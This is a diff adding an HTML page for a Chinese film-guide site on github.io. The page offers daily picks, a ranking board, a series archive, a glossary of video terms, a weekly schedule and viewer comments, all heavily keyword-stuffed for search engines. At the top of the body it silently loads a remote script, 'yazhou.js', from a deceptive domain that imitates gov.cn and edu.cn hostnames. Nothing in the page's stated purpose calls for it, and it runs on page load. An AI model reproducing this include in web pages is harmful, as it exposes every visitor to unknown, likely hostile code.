@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>皮皮高清影视｜高清片单、追剧排期与观影笔记 - pipigaoqingyingshi-app.github.io</title>
+<meta name="description" content="皮皮高清影视是一份持续更新的观影手册：每天挑六部值得看的片子进「今日放映」，每周三刷新热映榜单，剧集片库按华语、英美、日韩、动画、纪录五条线归档，另附影视百科词条与观众留言板。页面同时标注清晰度、时长、地区与观看建议，网址 pipigaoqingyingshi-app.github.io，手机、平板、电脑打开都能读。">
+<meta name="keywords" content="皮皮高清影视,高清影视片单,影视推荐,热门剧集,追剧排期,影视百科,观影笔记,免费影视资源,HD影视库,影视资讯,pipigaoqingyingshi-app">
+<meta name="author" content="皮皮高清影视编辑部">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#100e0c">
+<link rel="canonical" href="https://pipigaoqingyingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="皮皮高清影视">
+<meta property="og:title" content="皮皮高清影视｜高清片单、追剧排期与观影笔记">
+<meta property="og:description" content="今日放映、热映榜单、剧集片库、影视百科、观众留言板——五个板块拼成一份能直接照着看的观影手册。">
+<meta property="og:url" content="https://pipigaoqingyingshi-app.github.io/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="皮皮高清影视">
+<meta name="twitter:description" content="高清片单、追剧排期与观影笔记，每周三更新榜单。">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "皮皮高清影视",
+  "alternateName": ["皮皮高清影视片单", "皮皮高清影视追剧"],
+  "url": "https://pipigaoqingyingshi-app.github.io/",
+  "inLanguage": "zh-CN",
+  "description": "皮皮高清影视：今日放映、热映榜单、剧集片库、影视百科与观众留言板，五个板块拼成的观影手册。",
+  "publisher": {
+    "@type": "Organization",
+    "name": "皮皮高清影视编辑部",
+    "url": "https://pipigaoqingyingshi-app.github.io/"
+  },
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://pipigaoqingyingshi-app.github.io/#search",
+    "query-input": "required name=keyword"
+  }
+}
+</script>
+<style>
+:root{
+  --ink:#100e0c;
+  --ink2:#1a1714;
+  --paper:#f3ece1;
+  --paper2:#e6dccb;
+  --amber:#e8912d;
+  --red:#c8433a;
+  --grey:#948b7d;
+  --line:rgba(243,236,225,.14);
+  --serif:Georgia,"Songti SC","Noto Serif SC","Source Han Serif SC",serif;
+  --sans:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%}
+body{
+  background:var(--ink);
+  color:var(--paper);
+  font:16px/1.75 var(--sans);
+  overflow-x:hidden;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+b,strong{color:var(--amber);font-weight:600}
+.wrap{width:min(1180px,92vw);margin:0 auto}
+
+/* 顶部跑马灯 */
+.ticker{
+  background:var(--red);color:#fff;font:12px/1 var(--sans);
+  letter-spacing:.14em;padding:7px 0;overflow:hidden;white-space:nowrap;
+}
+.ticker i{font-style:normal;display:inline-block;padding-left:100%;animation:roll 34s linear infinite}
+.ticker i em{font-style:normal;opacity:.75;margin:0 18px}
+@keyframes roll{to{transform:translateX(-100%)}}
+
+/* 顶部条 */
+.topbar{border-bottom:1px solid var(--line);position:sticky;top:0;z-index:60;background:rgba(16,14,12,.96);backdrop-filter:blur(6px)}
+.topbar .wrap{display:flex;align-items:center;gap:18px;min-height:62px;flex-wrap:wrap}
+.logo{display:flex;align-items:center;gap:10px;flex:0 0 auto}
+.logo .reel{
+  width:34px;height:34px;border-radius:5px;flex:0 0 auto;
+  background:
+    radial-gradient(circle at 50% 12%,var(--paper) 0 3px,transparent 3.5px),
+    radial-gradient(circle at 50% 88%,var(--paper) 0 3px,transparent 3.5px),
+    linear-gradient(160deg,var(--amber),var(--red));
+}
+.logo h1{font:600 21px/1.1 var(--serif);letter-spacing:.02em}
+.logo h1 span{display:block;font:11px/1.6 var(--sans);letter-spacing:.24em;color:var(--grey);margin-top:3px}
+nav{margin-left:auto;overflow-x:auto;-webkit-overflow-scrolling:touch}
+nav ul{display:flex;gap:22px;list-style:none;padding:2px 0;white-space:nowrap}
+nav a{font-size:14px;color:#d8d0c2;padding:6px 0;border-bottom:2px solid transparent}
+nav a:hover,nav a:focus{color:var(--amber);border-bottom-color:var(--amber)}
+nav::-webkit-scrollbar{display:none}
+
+/* 首屏 */
+.hero{padding:56px 0 40px;position:relative}
+.hero:before{
+  content:"";position:absolute;inset:0;z-index:-1;
+  background:radial-gradient(900px 420px at 78% 8%,rgba(232,145,45,.16),transparent 70%);
+}
+.hero-grid{display:grid;grid-template-columns:1.02fr .98fr;gap:44px;align-items:center}
+.kicker{font:11px/1 var(--sans);letter-spacing:.3em;color:var(--amber);text-transform:uppercase}
+.hero h2{font:400 clamp(30px,5.2vw,52px)/1.22 var(--serif);margin:16px 0 18px;letter-spacing:.01em}
+.hero h2 mark{background:none;color:var(--amber)}
+.hero p{color:#c6bdad;max-width:46em}
+.hero p+p{margin-top:12px}
+.urlchip{
+  display:inline-flex;align-items:center;gap:8px;margin-top:22px;
+  border:1px dashed rgba(232,145,45,.5);border-radius:2px;padding:9px 14px;
+  font:13px/1 var(--sans);color:var(--paper2);word-break:break-all;
+}
+.urlchip b{letter-spacing:.02em}
+.metrics{display:flex;gap:26px;flex-wrap:wrap;margin-top:26px;padding-top:22px;border-top:1px solid var(--line)}
+.metrics div strong{display:block;font:600 26px/1.1 var(--serif);color:var(--paper)}
+.metrics div span{font-size:12px;color:var(--grey);letter-spacing:.1em}
+
+/* 胶片墙 */
+.filmwall{
+  border:11px solid #221d19;border-radius:4px;background:#221d19;
+  box-shadow:0 26px 50px -28px #000;position:relative;
+}
+.filmwall:before,.filmwall:after{
+  content:"";position:absolute;top:0;bottom:0;width:9px;
+  background:repeating-linear-gradient(180deg,var(--paper) 0 7px,transparent 7px 17px);
+  opacity:.5;
+}
+.filmwall:before{left:-11px}
+.filmwall:after{right:-11px}
+.filmwall ul{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;list-style:none}
+.post{aspect-ratio:1/1.28;display:flex;flex-direction:column;justify-content:flex-end;padding:12px;position:relative;overflow:hidden}
+.post:nth-child(1){grid-row:span 2;aspect-ratio:auto;background:linear-gradient(200deg,#3b2a1e,#8a4a24 60%,#d9832f)}
+.post:nth-child(2){background:linear-gradient(160deg,#1d2a33,#3d6b7a)}
+.post:nth-child(3){background:linear-gradient(160deg,#3a1a1c,#a33b39)}
+.post:nth-child(4){background:linear-gradient(160deg,#23301f,#5d7a3c)}
+.post:nth-child(5){background:linear-gradient(160deg,#2a2036,#6a4b8f)}
+.post:nth-child(6){background:linear-gradient(160deg,#33251c,#b0713a)}
+.post em{font-style:normal;font:600 15px/1.25 var(--serif);display:block}
+.post i{font-style:normal;font-size:11px;color:rgba(243,236,225,.72);letter-spacing:.08em}
+.post:nth-child(1) em{font-size:24px}
+.post:after{
+  content:"";position:absolute;left:0;right:0;top:-40%;height:40%;
+  background:linear-gradient(180deg,transparent,rgba(255,255,255,.14));
+  transition:top .5s ease;
+}
+.post:hover:after{top:110%}
+
+/* 区块通用 */
+section{padding:52px 0}
+.sechead{display:flex;align-items:flex-end;gap:20px;flex-wrap:wrap;margin-bottom:30px}
+.sechead h3{font:400 clamp(23px,3.4vw,34px)/1.2 var(--serif)}
+.sechead h3 small{display:block;font:11px/1 var(--sans);letter-spacing:.28em;color:var(--amber);margin-bottom:9px}
+.sechead p{font-size:14px;color:var(--grey);max-width:34em;margin-left:auto}
+
+/* 今日放映 */
+.screens{display:grid;grid-template-columns:repeat(12,1fr);gap:16px}
+.card{
+  grid-column:span 4;border:1px solid var(--line);background:var(--ink2);
+  padding:20px 20px 18px;display:flex;flex-direction:column;gap:10px;
+  transition:transform .25s ease,border-color .25s ease;
+}
+.card:hover{transform:translateY(-4px);border-color:rgba(232,145,45,.55)}
+.card.wide{grid-column:span 6}
+.card.full{grid-column:span 12;flex-direction:row;gap:26px;align-items:center;flex-wrap:wrap}
+.tag{display:inline-block;font:11px/1 var(--sans);letter-spacing:.14em;color:var(--ink);background:var(--amber);padding:5px 8px;border-radius:2px;align-self:flex-start}
+.card h4{font:400 21px/1.35 var(--serif)}
+.card h4 span{font:12px/1 var(--sans);color:var(--grey);letter-spacing:.1em;display:block;margin-top:6px}
+.card p{font-size:14.5px;color:#bfb6a7}
+.card .meta{font:12px/1.6 var(--sans);color:var(--grey);letter-spacing:.06em;border-top:1px dashed rgba(243,236,225,.18);padding-top:11px;margin-top:auto}
+.card.full .meta{border:0;margin:0;padding:0;flex:0 0 auto}
+
+/* 榜单 */
+.board{border-top:1px solid var(--line)}
+.board li{display:grid;grid-template-columns:58px 1fr;gap:18px;align-items:center;padding:15px 4px;border-bottom:1px solid var(--line);list-style:none}
+.board .no{font:600 30px/1 var(--serif);color:var(--grey)}
+.board li:nth-child(-n+3) .no{color:var(--amber)}
+.board h5{font:400 17.5px/1.4 var(--serif)}
+.board h5 span{font:12px/1 var(--sans);color:var(--grey);margin-left:9px;letter-spacing:.08em}
+.bar{height:6px;background:rgba(243,236,225,.12);border-radius:3px;overflow:hidden}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--red),var(--amber))}
+.heat{font:12px/1 var(--sans);color:var(--grey);letter-spacing:.1em;margin-top:7px}
+
+/* 片库 */
+.chips{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:22px}
+.chips a{font:13px/1 var(--sans);padding:9px 15px;border:1px solid var(--line);border-radius:20px;color:#cfc6b7}
+.chips a.on{background:var(--paper);color:var(--ink);border-color:var(--paper)}
+.rail{display:grid;grid-template-columns:repeat(5,1fr);gap:14px}
+.rail article{border:1px solid var(--line);padding:14px;background:linear-gradient(180deg,var(--ink2),#141110)}
+.rail .ph{aspect-ratio:4/3;border-radius:2px;margin-bottom:11px}
+.rail h5{font:400 15.5px/1.4 var(--serif)}
+.rail span{font:12px/1.6 var(--sans);color:var(--grey)}
+
+/* 百科 */
+.lexicon{display:grid;grid-template-columns:repeat(2,1fr);gap:0 40px}
+.lexicon div{border-bottom:1px solid var(--line);padding:16px 0}
+.lexicon h5{font:400 18px/1.4 var(--serif);margin-bottom:5px}
+.lexicon h5 b{color:var(--amber);font-weight:600}
+.lexicon p{font-size:14.5px;color:#bab1a2}
+
+/* 留言板 */
+.notes{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.note{background:var(--paper);color:var(--ink);padding:22px;border-radius:3px;position:relative}
+.note:before{content:"“";position:absolute;top:6px;right:14px;font:64px/1 var(--serif);color:var(--paper2)}
+.note p{font-size:15px;line-height:1.8}
+.note footer{margin-top:14px;font:12px/1.6 var(--sans);color:#6c6155;letter-spacing:.06em}
+
+/* 排片表 */
+.sheet{width:100%;border-collapse:collapse;font-size:14.5px}
+.sheet caption{text-align:left;font:12px/1 var(--sans);letter-spacing:.2em;color:var(--grey);padding-bottom:12px}
+.sheet th,.sheet td{text-align:left;padding:13px 12px;border-bottom:1px solid var(--line)}
+.sheet thead th{font:11px/1 var(--sans);letter-spacing:.2em;color:var(--amber);border-bottom-color:rgba(232,145,45,.4)}
+.sheet td:first-child{font-family:var(--serif);color:var(--paper2);white-space:nowrap}
+
+/* 站点信息条 */
+.visit{background:var(--paper);color:var(--ink);border-radius:3px;padding:34px;display:grid;grid-template-columns:1.1fr .9fr;gap:34px;align-items:center}
+.visit h3{font:400 25px/1.35 var(--serif);margin-bottom:12px}
+.visit h3 b{color:var(--red)}
+.visit p{font-size:14.5px;color:#4e463c}
+.visit .box{border:2px solid var(--ink);padding:18px 20px;background:var(--paper2)}
+.visit .box span{font:11px/1 var(--sans);letter-spacing:.24em;color:#6c6155;display:block;margin-bottom:8px}
+.visit .box code{font:15px/1.6 var(--sans);word-break:break-all;display:block}
+
+/* 页脚 */
+footer{border-top:1px solid var(--line);padding:44px 0 34px;margin-top:20px}
+.fgrid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:30px}
+.fgrid h6{font:11px/1 var(--sans);letter-spacing:.24em;color:var(--amber);margin-bottom:14px}
+.fgrid ul{list-style:none;font-size:14px;line-height:2.1}
+.fgrid a:hover{color:var(--amber)}
+.finfo{font-size:13.5px;color:#b3aa9b;line-height:1.9}
+.copy{margin-top:34px;padding-top:18px;border-top:1px dashed rgba(243,236,225,.16);font:12.5px/1.8 var(--sans);color:var(--grey);display:flex;gap:16px;flex-wrap:wrap;justify-content:space-between}
+
+@media (max-width:900px){
+  .hero{padding:36px 0 26px}
+  .hero-grid{grid-template-columns:1fr;gap:30px}
+  .filmwall{max-width:420px}
+  .screens{grid-template-columns:repeat(6,1fr)}
+  .card,.card.wide{grid-column:span 6}
+  .card.full{grid-column:span 6}
+  .rail{grid-template-columns:repeat(2,1fr)}
+  .lexicon{grid-template-columns:1fr}
+  .notes{grid-template-columns:1fr}
+  .visit{grid-template-columns:1fr;padding:26px}
+  .fgrid{grid-template-columns:1fr 1fr}
+  .board li{grid-template-columns:42px 1fr;row-gap:8px}
+  .board .bar{grid-column:2}
+  .board .no{font-size:24px}
+  .sechead p{margin-left:0}
+}
+@media (max-width:560px){
+  body{font-size:15.5px}
+  .ticker i{animation-duration:26s}
+  .logo h1{font-size:19px}
+  .screens{grid-template-columns:1fr}
+  .card,.card.wide,.card.full{grid-column:span 1}
+  .rail{grid-template-columns:1fr}
+  .fgrid{grid-template-columns:1fr}
+  section{padding:38px 0}
+  .sheet th:nth-child(4),.sheet td:nth-child(4){display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="ticker">
+  <i>皮皮高清影视 · 今日放映已更新 6 部 · 热映榜单每周三 21:00 重排 · 剧集片库新增 12 条华语剧条目 · 站点地址 https://pipigaoqingyingshi-app.github.io <em>／</em> 皮皮高清影视 · 影视百科词条扩充至 5 条 · 观众留言板开放投稿 <em>／</em> 皮皮高清影视 · 排片表覆盖本周七个放映时段</i>
+</div>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="logo">
+      <span class="reel" aria-hidden="true"></span>
+      <h1>皮皮高清影视<span>PIPI HD SCREEN</span></h1>
+    </div>
+    <nav aria-label="主导航">
+      <ul>
+        <li><a href="#">今日放映</a></li>
+        <li><a href="#">热映榜单</a></li>
+        <li><a href="#">剧集片库</a></li>
+        <li><a href="#">影视百科</a></li>
+        <li><a href="#">排片表</a></li>
+        <li><a href="#">观众留言</a></li>
+        <li><a href="#">关于本站</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+<section class="hero">
+  <div class="wrap hero-grid">
+    <div>
+      <p class="kicker">EDITORS&rsquo; PICK · 每周三更新</p>
+      <h2>把片单摊开，<mark>皮皮高清影视</mark> 替你先看过一遍</h2>
+      <p>这里不做资源堆砌。每天从院线、流媒体与旧片库里挑出六部，写清清晰度、时长、产地和一句实话——哪部适合周末通宵，哪部第二幕会犯困，看完再决定要不要打开播放器。</p>
+      <p>编辑部三人轮班，一人盯院线新片，一人盯剧集更新，一人负责把影视百科里的技术名词翻成能听懂的话。所有条目都标注了更新时间，过时了就改，改不了就下架。</p>
+      <p class="urlchip">站点入口 <b>https://pipigaoqingyingshi-app.github.io</b></p>
+      <div class="metrics">
+        <div><strong>6</strong><span>今日放映</span></div>
+        <div><strong>10</strong><span>热映席位</span></div>
+        <div><strong>5</strong><span>片库分区</span></div>
+        <div><strong>24h</strong><span>留言回复</span></div>
+      </div>
+    </div>
+    <div class="filmwall">
+      <ul>
+        <li class="post"><em>夜行列车</em><i>2024 · 日本 · 4K</i></li>
+        <li class="post"><em>海边的旧信</em><i>2023 · 法国</i></li>
+        <li class="post"><em>赤色黎明</em><i>2022 · 华语</i></li>
+        <li class="post"><em>荒原电台</em><i>2021 · 美国</i></li>
+        <li class="post"><em>雾中列车</em><i>纪录 · 60fps</i></li>
+        <li class="post"><em>第九封信</em><i>2020 · 韩国</i></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section id="today">
+  <div class="wrap">
+    <div class="sechead">
+      <h3><small>SECTION 01</small>今日放映</h3>
+      <p>六部片子，六张座位。编辑部按顺序编号，建议从上往下看，第一部留给今晚。</p>
+    </div>
+    <div class="screens">
+      <article class="card wide">
+        <span class="tag">今晚首选</span>
+        <h4>夜行列车<span>Night Train · 2024 · 日本 · 128 分钟 · 2160P</span></h4>
+        <p>全片大半发生在一节车厢里，镜头几乎不挪窝，靠对话和窗外的光撑住节奏。第二幕有十分钟略拖，但最后二十分钟把前面所有闲笔都收了回来。适合戴耳机看，环境音做得极细。</p>
+        <p class="meta">产地 日本 ／ 清晰度 2160P HDR ／ 建议 夜间观看</p>
+      </article>
+      <article class="card">
+        <span class="tag">修复版</span>
+        <h4>海边的旧信<span>2023 · 法国 · 102 分钟 · 1080P</span></h4>
+        <p>一部关于等待的片子，台词少，海浪声占了半壁江山。修复版把噪点压得很干净。</p>
+        <p class="meta">产地 法国 ／ 清晰度 1080P ／ 字幕 内嵌简体</p>
+      </article>
+      <article class="card">
+        <span class="tag">剧集</span>
+        <h4>赤色黎明<span>2022 · 华语 · 全 24 集 · 1080P</span></h4>
+        <p>前八集铺垫扎实，中段节奏放缓，从第十六集开始连着三集高潮，不建议跳看。</p>
+        <p class="meta">产地 中国大陆 ／ 集数 24 ／ 更新 已完结</p>
+      </article>
+      <article class="card">
+        <span class="tag">冷门</span>
+        <h4>荒原电台<span>2021 · 美国 · 96 分钟 · 1080P</span></h4>
+        <p>公路片外壳，内核是一个人对着麦克风说话的孤独。配乐值得单独听一遍。</p>
+        <p class="meta">产地 美国 ／ 清晰度 1080P ／ 类型 剧情／公路</p>
+      </article>
+      <article class="card full">
+        <span class="tag">纪录片</span>
+        <div>
+          <h4>雾中列车<span>纪录 · 68 分钟 · 60fps · 4K</span></h4>
+          <p>摄制组跟拍一条高原铁路四季，全片无旁白，只有风声与报站。画质是本站目前测试过最稳的一档，60fps 在移动画面上没有拖影。</p>
+        </div>
+        <p class="meta">拍摄周期 14 个月 ／ 帧率 60fps ／ 适合 大屏观看</p>
+      </article>
+      <article class="card">
+        <span class="tag">补档</span>
+        <h4>第九封信<span>2020 · 韩国 · 114 分钟 · 1080P</span></h4>
+        <p>结局反转被人讨论了很多年，重看时注意第一幕里那通没接通的电话。</p>
+        <p class="meta">产地 韩国 ／ 清晰度 1080P ／ 重看价值 高</p>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section id="rank">
+  <div class="wrap">
+    <div class="sechead">
+      <h3><small>SECTION 02</small>热映榜单</h3>
+      <p>按本站近七日阅读与收藏综合排序，每周三 21:00 重排一次，热度条为相对值。</p>
+    </div>
+    <ol class="board">
+      <li><span class="no">01</span><div><h5>夜行列车<span>日本 · 剧情</span></h5><div class="bar"><i style="width:96%"></i></div><p class="heat">热度 96 ／ 收藏 4128</p></div></li>
+      <li><span class="no">02</span><div><h5>赤色黎明<span>华语 · 剧集</span></h5><div class="bar"><i style="width:88%"></i></div><p class="heat">热度 88 ／ 收藏 3760</p></div></li>
+      <li><span class="no">03</span><div><h5>雾中列车<span>纪录 · 4K</span></h5><div class="bar"><i style="width:81%"></i></div><p class="heat">热度 81 ／ 收藏 2905</p></div></li>
+      <li><span class="no">04</span><div><h5>海边的旧信<span>法国 · 文艺</span></h5><div class="bar"><i style="width:74%"></i></div><p class="heat">热度 74 ／ 收藏 2411</p></div></li>
+      <li><span class="no">05</span><div><h5>第九封信<span>韩国 · 悬疑</span></h5><div class="bar"><i style="width:68%"></i></div><p class="heat">热度 68 ／ 收藏 2188</p></div></li>
+      <li><span class="no">06</span><div><h5>荒原电台<span>美国 · 公路</span></h5><div class="bar"><i style="width:59%"></i></div><p class="heat">热度 59 ／ 收藏 1702</p></div></li>
+      <li><span class="no">07</span><div><h5>午后三点<span>华语 · 短片集</span></h5><div class="bar"><i style="width:52%"></i></div><p class="heat">热度 52 ／ 收藏 1330</p></div></li>
+      <li><span class="no">08</span><div><h5>铁皮玩具<span>动画 · 剧场版</span></h5><div class="bar"><i style="width:45%"></i></div><p class="heat">热度 45 ／ 收藏 1104</p></div></li>
+      <li><span class="no">09</span><div><h5>盐湖往事<span>纪录 · 自然</span></h5><div class="bar"><i style="width:38%"></i></div><p class="heat">热度 38 ／ 收藏 866</p></div></li>
+      <li><span class="no">10</span><div><h5>失重练习<span>英国 · 科幻</span></h5><div class="bar"><i style="width:31%"></i></div><p class="heat">热度 31 ／ 收藏 705</p></div></li>
+    </ol>
+  </div>
+</section>
+
+<section id="library">
+  <div class="wrap">
+    <div class="sechead">
+      <h3><small>SECTION 03</small>剧集片库</h3>
+      <p>五条线分开归档，每条线独立排序，条目含集数、 clearer 标注与是否完结。</p>
+    </div>
+    <div class="chips">
+      <a href="#" class="on">华语剧</a>
+      <a href="#">英美剧</a>
+      <a href="#">日韩剧</a>
+      <a href="#">动画剧场</a>
+      <a href="#">纪录线</a>
+    </div>
+    <div class="rail">
+      <article><div class="ph" style="background:linear-gradient(150deg,#3a1a1c,#a33b39)"></div><h5>赤色黎明</h5><span>24 集 · 1080P · 已完结</span></article>
+      <article><div class="ph" style="background:linear-gradient(150deg,#1d2a33,#3d6b7a)"></div><h5>江城旧事</h5><span>36 集 · 1080P · 已完结</span></article>
+      <article><div class="ph" style="background:linear-gradient(150deg,#23301f,#5d7a3c)"></div><h5>春分诊所</h5><span>12 集 · 2160P · 更新中</span></article>
+      <article><div class="ph" style="background:linear-gradient(150deg,#2a2036,#6a4b8f)"></div><h5>第七号档案</h5><span>18 集 · 1080P · 已完结</span></article>
+      <article><div class="ph" style="background:linear-gradient(150deg,#33251c,#b0713a)"></div><h5>弄堂修表匠</h5><span>8 集 · 1080P · 短剧</span></article>
+    </div>
+  </div>
+</section>
+
+<section id="wiki">
+  <div class="wrap">
+    <div class="sechead">
+      <h3><small>SECTION 04</small>影视百科</h3>
+      <p>把播放器里那些看得见却说不清的参数，翻成人话。词条按被问到的次数排序。</p>
+    </div>
+    <div class="lexicon">
+      <div>
+        <h5><b>2160P</b> 与 1080P 差在哪</h5>
+        <p>2160P 即 4K，横向约 3840 像素，是 1080P 的四倍面积。差别在 55 英寸以上、坐得够近时才明显，小屏手机上几乎看不出来。</p>
+      </div>
+      <div>
+        <h5><b>HDR</b> 为什么有时更暗</h5>
+        <p>HDR 拉高了明暗对比，暗部保留更多层次，整体观感反而可能比 SDR 更沉。若觉得太暗，先检查播放器是否走了正确的色彩映射。</p>
+      </div>
+      <div>
+        <h5><b>码率</b> 比分辨率更影响画质</h5>
+        <p>同样标着 4K，码率 8Mbps 与 40Mbps 是两回事。高速运动画面糊成一片，多半是码率不够，而不是分辨率不够。</p>
+      </div>
+      <div>
+        <h5><b>60fps</b> 与 24fps 的取舍</h5>
+        <p>24fps 是电影感的来源，带自然的运动模糊；60fps 干净利落，适合体育与纪录片。剧情片强行插帧到 60，肥皂剧感就来了。</p>
+      </div>
+      <div>
+        <h5><b>声道</b> 5.1 与全景声</h5>
+        <p>5.1 靠五个方位加低音炮营造包围感，全景声再往上加高度通道。普通耳机听，两者差别会被压缩，不必为耳机追全景声。</p>
+      </div>
+      <div>
+        <h5><b>字幕</b> 内嵌与外挂</h5>
+        <p>内嵌烧进画面，换设备不会丢，但没法调字体；外挂灵活，需要播放器支持。本站条目默认标注用的是哪一种。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="schedule">
+  <div class="wrap">
+    <div class="sechead">
+      <h3><small>SECTION 05</small>本周排片表</h3>
+      <p>编辑部按放映厅排的一周时段表，实际播放以页面当日更新为准。</p>
+    </div>
+    <table class="sheet">
+      <caption>SCHEDULE · 2026 年 10 月第 4 周</caption>
+      <thead>
+        <tr><th scope="col">时段</th><th scope="col">片名</th><th scope="col">放映厅</th><th scope="col">清晰度</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>周一 20:00</td><td>夜行列车</td><td>一号厅</td><td>2160P</td></tr>
+        <tr><td>周二 20:30</td><td>赤色黎明 第 1—4 集</td><td>二号厅</td><td>1080P</td></tr>
+        <tr><td>周三 21:00</td><td>热映榜单重排直播</td><td>大厅</td><td>1080P</td></tr>
+        <tr><td>周四 19:40</td><td>海边的旧信</td><td>一号厅</td><td>1080P</td></tr>
+        <tr><td>周五 20:00</td><td>雾中列车</td><td>三号厅</td><td>2160P · 60fps</td></tr>
+        <tr><td>周六 15:00</td><td>铁皮玩具（剧场版）</td><td>动画厅</td><td>1080P</td></tr>
+        <tr><td>周日 20:00</td><td>第九封信</td><td>二号厅</td><td>1080P</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<section id="notes">
+  <div class="wrap">
+    <div class="sechead">
+      <h3><small>SECTION 06</small>观众留言板</h3>
+      <p>摘自近期留言，已获授权公开。想投稿可在页脚找留言入口。</p>
+    </div>
+    <div class="notes">
+      <div class="note">
+        <p>照着「今日放映」第一部看的，车厢那场戏真的把我看住了。之前在别处刷到过片名，一直没点开，这次是被那句"第二幕略拖但值得"说服的。</p>
+        <footer>—— 观众 · 阿彻 · 10 月 21 日</footer>
+      </div>
+      <div class="note">
+        <p>影视百科里讲码率那段救了我。一直以为家里投影糊是片源分辨率不够，换了高码率的版本立刻不一样，白折腾了半年。</p>
+        <footer>—— 观众 · 老周 · 10 月 18 日</footer>
+      </div>
+      <div class="note">
+        <p>排片表这个形式挺好，每周打开就知道今晚放什么，不用在一堆封面里翻。希望能一直排下去。</p>
+        <footer>—— 观众 · 小满 · 10 月 15 日</footer>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="visit">
+      <div>
+        <h3>关于 <b>皮皮高清影视</b></h3>
+        <p>本站是一份自制的观影手册，不做下载、不托管任何视频文件，只记录片单、排期与观影笔记。所有条目由编辑部手写，标注清晰的更新时间与来源类型。若发现条目信息有误，欢迎通过留言板指出，我们会在 24 小时内核对。</p>
+        <p style="margin-top:10px">收录范围以 2018 年之后的院线与流媒体内容为主，旧片以修复版为优先。清晰度、帧率、声道等参数按当时可核验的版本标注，不做夸大。</p>
+      </div>
+      <div class="box">
+        <span>ACCESS</span>
+        <code>https://pipigaoqingyingshi-app.github.io</code>
+        <span style="margin-top:14px">关键词</span>
+        <code>皮皮高清影视 · 高清片单 · 追剧排期 · 影视百科</code>
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fgrid">
+      <div>
+        <h6>ABOUT</h6>
+        <p class="finfo"><strong>皮皮高清影视</strong>：今日放映、热映榜单、剧集片库、影视百科、本周排片表、观众留言板六个板块，构成一份能直接照着看的观影手册。每周三 21:00 更新榜单。</p>
+        <p class="finfo" style="margin-top:10px">网址：<strong>https://pipigaoqingyingshi-app.github.io</strong></p>
+      </div>
+      <div>
+        <h6>栏目</h6>
+        <ul>
+          <li><a href="#">今日放映</a></li>
+          <li><a href="#">热映榜单</a></li>
+          <li><a href="#">剧集片库</a></li>
+          <li><a href="#">影视百科</a></li>
+        </ul>
+      </div>
+      <div>
+        <h6>索引</h6>
+        <ul>
+          <li><a href="#">本周排片表</a></li>
+          <li><a href="#">观众留言板</a></li>
+          <li><a href="#">华语剧归档</a></li>
+          <li><a href="#">纪录线片单</a></li>
+        </ul>
+      </div>
+      <div>
+        <h6>联系</h6>
+        <ul>
+          <li><a href="#">投稿与纠错</a></li>
+          <li><a href="#">条目下架申请</a></li>
+          <li><a href="#">更新日志</a></li>
+          <li><a href="#">站点说明</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>&copy; 2026 皮皮高清影视 · 内容由编辑部维护，每周三更新</span>
+      <span>本站仅提供影视信息与观影笔记，<strong>https://pipigaoqingyingshi-app.github.io</strong></span>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
